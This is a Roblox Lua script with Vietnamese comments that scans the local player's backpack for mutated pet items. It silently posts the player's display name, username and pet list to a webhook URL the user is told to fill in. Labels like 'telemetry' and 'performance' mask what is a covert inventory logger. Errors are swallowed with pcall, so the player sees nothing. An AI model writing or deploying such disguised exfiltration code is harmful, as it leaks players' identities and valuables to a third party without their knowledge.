local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- CẤU HÌNH (THAY LINK VERCEL CỦA BẠN)
local METRICS_ENDPOINT = "https://ten-du-an.vercel.app/api/webhook"
local TELEMETRY_ID = "kF9mQ2xR8pL3vN7j"

local function GetInventoryMetrics()
    local inventoryData = {}
    local totalCount = 0
    local petList = {}
    
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return petList, 0 end

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local name = tool:GetAttribute("BrainrotName") or tool.Name
            local mutation = tool:GetAttribute("Mutation")
            
            -- Lọc pet: Bỏ Basic Bat, yêu cầu phải có Mutation
            if name ~= "Basic Bat" and mutation and mutation ~= "" then
                -- Key kết hợp Tên + Mutation để tách biệt
                local key = name .. " [" .. mutation .. "]"
                inventoryData[key] = (inventoryData[key] or 0) + 1
                totalCount = totalCount + 1
            end
        end
    end
    
    for key, count in pairs(inventoryData) do
        table.insert(petList, "• " .. key .. " x" .. count)
    end
    return petList, totalCount
end

local function SendReport()
    if not HttpService.HttpEnabled then return end
    
    local petList, totalCount = GetInventoryMetrics()
    if totalCount == 0 then return end
    
    local payload = {
        telemetry = TELEMETRY_ID,
        data = {
            player = LocalPlayer.DisplayName .. " (" .. LocalPlayer.Name .. ")",
            timestamp = os.date("%d/%m/%Y %H:%M:%S"),
            performance = {
                inventory_count = totalCount,
                pets = petList
            }
        }
    }

    task.spawn(function()
        pcall(function()
            HttpService:RequestAsync({
                Url = METRICS_ENDPOINT,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

-- Thực thi
SendReport()
